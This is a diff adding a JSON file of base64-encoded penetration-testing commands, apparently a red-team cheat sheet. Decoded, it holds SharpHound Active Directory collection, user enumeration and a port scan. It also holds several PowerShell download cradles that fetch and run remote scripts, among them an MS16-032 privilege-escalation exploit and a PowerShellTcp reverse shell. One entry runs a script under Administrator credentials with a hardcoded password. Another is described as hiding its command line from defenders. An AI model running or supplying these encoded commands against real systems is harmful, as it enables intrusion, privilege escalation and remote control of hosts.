@@ -1,0 +1,42 @@
+{
+    "command": {
+        "sharphound_execution": {
+            "description": "Standard SharpHound execution (standard LDAP is encrypted, but may have to play with TLS/Cert options)",
+            "commands": [
+                "LlxTaGFycEhvdW5kLmV4ZSAtYyBBQ0wgLWQgRE9NQUlOLk5FVCAtLVNlY3VyZUxkYXAgLS1TdGF0dXNJbnRlcnZhbCAyMDAwMAouXFNoYXJwSG91bmQuZXhlIC1jIEFDTCAtZCBET01BSU4uTkVUIC0tU2VjdXJlTGRhcCAtLUlnbm9yZUxkYXBDZXJ0IC0tU3RhdHVzSW50ZXJ2YWwgMjAwMDAKLlxTaGFycEhvdW5kLmV4ZSAtYyBBQ0wgLWQgRE9NQUlOLk5FVCAtLVN0YXR1c0ludGVydmFsIDIwMDAw"
+            ]
+        },
+        "ps_iex_ms16-032": {
+            "description": "powershell invocation of MS16-032",
+            "commands": [
+                "SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuZG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly8xMC4xMC4xNi42NS9JbnZva2UtTVMxNjAzMi5wczEnKQ=="
+            ]
+        },
+        "ps_get-aduser": {
+            "description": "PS Get-ADUser Usage",
+            "commands": [
+                "KGdldC1hZHVzZXIgLWZpbHRlciB7KEZJRUxEMSAtTGlrZSAic29tZXRoaW5nIikgWy1vcnwtYW5kXSAoRklFTEQyIC1MaWtlICJzb21ldGhpbmciKX0pLmNvdW50CmdldC1hZHVzZXIgLUZpbHRlciAiKERlcGFydG1lbnQgLUxpa2UgJypEaWdpdGFsKicpIC1hbmQgKFNhbUFjY291bnROYW1lIC1MaWtlICdjaGFycyonKSIgLVByb3BlcnRpZXMgRGVwYXJ0bWVudCxOYW1lLFNhbUFjY291bnROYW1lIHxFeHBvcnQtQ3N2IC1QYXRoIC5cZGlnaXRhbF9jb250cmFjdG9ycy5jc3YgLU5vVHlwZUluZm9ybWF0aW9u"
+            ]
+        },
+        "ps_port_scan": {
+            "description": "Port scanning with PS",
+            "commands": [
+                "MS4uMTAyNCB8ICUge2VjaG8gKChuZXctb2JqZWN0IE5ldC5Tb2NrZXRzLlRjcENsaWVudCkuQ29ubmVjdCgiMTAuMC4wLjEwMCIsJF8pKSAiUG9ydCAkXyBpcyBvcGVuISJ9IDI+JG51bGw="
+            ]
+        },
+        "ps_pscredential_elevate_service_start": {
+            "description": "Start a service with elevated credentials using PSCredential",
+            "commands": [
+                "JE15UGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdTMG0zUDRzc1cwcmQnIC1Bc1BsYWluVGV4dCAtRm9yY2UKJGNyZWRlbnRpYWwgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdBZG1pbmlzdHJhdG9yJywkY3JlZGVudGlhbCkKU3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggInBvd2Vyc2hlbGwiIC1hcmd1bWVudGxpc3QgIklFWChOZXctT2JqZWN0IE5ldC53ZWJDbGllbnQpLmRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTAuMTAuMTQuNDUvc29tZXNoZWxsLnBzMScpIiAtQ3JlZGVudGlhbCAkY3JlZGVudGlhbA=="
+            ]
+        },
+        "ps_iex_stdin": {
+            "description": "Different way to run IEX using stdin (may not show defenders exact command line arguments at certain process exec levels)",
+            "commands": [
+                "ZWNobyBJRVgoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5kb3dubG9hZFN0cmluZygnaHR0cDovL01ZLlNFUi5WRVIuSVA6ODA4MC9JbnZva2UtUG93ZXJTaGVsbFRjcC5wczEnKSB8cG93ZXJzaGVsbCAtbm9wcm9maWxlIC0="
+            ]
+        }
+    },
+    "configuration": {
+    }
+}
